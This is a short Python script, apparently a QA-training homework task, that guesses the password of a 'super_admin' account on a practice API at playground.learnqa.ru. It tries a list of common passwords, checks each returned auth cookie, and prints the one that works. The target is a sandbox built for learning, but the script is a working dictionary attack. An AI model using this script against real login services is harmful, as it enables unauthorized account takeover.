import requests

passwords_without_doubles = ["password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567", "letmein",
                             "trustno1", "dragon", "baseball", "111111", "iloveyou", "master", "sunshine", "ashley",
                             "bailey", "passw0rd", "shadow", "123123", "654321", "superman", "qazwsx", "michael",
                             "Football", "welcome", "jesus", "ninja", "mustang", "password1", "123456789", "adobe123",
                             "admin", "1234567890", "photoshop", "1234", "12345", "princess", "azerty", "000000",
                             "access", "696969", "batman", "solo", "starwars", "flower", "hottie", "loveme", "zaq1zaq1",
                             "hello", "freedom", "whatever", "666666", "!@#$%^&*", "charlie", "aa123456", "donald",
                             "qwerty123","1q2w3e4r", "555555", "lovely", "7777777", "888888", "123qwe"]

get_secret_password_homework = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_auth_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

for password in passwords_without_doubles:
    response_1 = requests.post(get_secret_password_homework, data={"login": "super_admin", "password": password})
    cookie = response_1.cookies.get("auth_cookie")
    cookies = {"auth_cookie": cookie}
    response_2 = requests.post(check_auth_cookie, cookies=cookies)
    if response_2.text == "You are NOT authorized":
        print("Пароль неправильный")
    elif response_2.text != "You are NOT authorized":
        print(f"Верный пароль: {password}")
        print(f"Получаемый текст при верном пароле: {response_2.text}")
        break

